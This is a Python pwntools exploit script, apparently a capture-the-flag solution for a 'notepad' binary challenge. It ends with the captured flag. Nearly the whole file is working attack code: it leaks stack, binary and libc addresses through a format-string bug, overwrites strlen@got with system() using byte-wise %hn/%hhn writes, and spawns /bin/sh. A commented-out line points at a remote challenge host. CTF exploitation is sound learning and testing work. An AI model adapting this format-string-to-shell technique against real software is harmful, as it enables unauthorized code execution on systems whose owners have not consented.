from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./notepad_patched', '''
    b *(vuln+222)
    b *(vuln+408)
    b *(vuln+553)
    b *(vuln+712)
    continue
''')

# p = remote('mallorcy.aws.jerseyctf.com', 9001)

def create_note(content):
    p.sendlineafter(b"3: Print A note\n", b'0')
    p.sendlineafter(b"please enter content:\n", content)

def edit_note(index, content):
    p.sendlineafter(b"3: Print A note\n", b'1')
    p.sendlineafter(b"Which note would you like to edit?\n", str(index).encode())
    p.sendlineafter(b"please enter content:\n", content)

def delete_note(index):
    p.sendlineafter(b"3: Print A note\n", b'2')
    p.sendlineafter(b"Which note would you like to delete?\n", str(index).encode())
    
def print_note(index):
    p.sendlineafter(b"3: Print A note\n", b'3')
    p.sendlineafter(b"Which note would you like to print?\n", str(index).encode())
    p.recvuntil(b"contains:\n")
    return p.recvline().strip()

# 1. leak vuln rbp value, elf base address, and glibc base address
create_note(b'A'*0x18)
edit_note(0, b'%8$p%9$p%29$p')
leaks = print_note(0)
vuln_rbp_val = int(leaks[0:14], 16)
log.info(f"vuln rbp value: {hex(vuln_rbp_val)}")
elf_base_addr = int(leaks[14:28], 16)-0x16b8
log.info(f"elf base address: {hex(elf_base_addr)}")
glibc_base_addr = int(leaks[28:42], 16)-0x24c56
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# 2. overwrite strlen@got with glibc system address using fmtstr
create_note(b'B'*0x18)
# 8th argument of printf is vuln rbp value, overwrite value it points to with vuln return address
edit_note(1, f'%{(vuln_rbp_val+0x8)&0xffff}c%8$hn'.encode())
print_note(1)
e = ELF('./notepad_patched')
glibc_e = ELF('./libc.so.6')
# only need to overwrite last three bytes of strlen@got with glibc system address
for i in range(3):
    # 26th argument of printf is vuln return address, overwrite value it points to with correct offset byte of strlen@got 
    edit_note(1, f'%{(elf_base_addr+e.got.strlen+i)&0xffff}c%26$hn'.encode())
    print_note(1)
    # 27th argument of printf is strlen@got including offset, overwrite value it points to with correct byte of glibc system address
    edit_note(1, f'%{(glibc_base_addr+glibc_e.sym.system)>>(8*i)&0xff}c%27$hhn'.encode())
    print_note(1)

# 3. trigger system('/bin/sh\x00')
create_note(b'/bin/sh\x00')

p.interactive()

# jctfv{WHAT_4_L04D_0F_M4LL4RCY_a1520eb}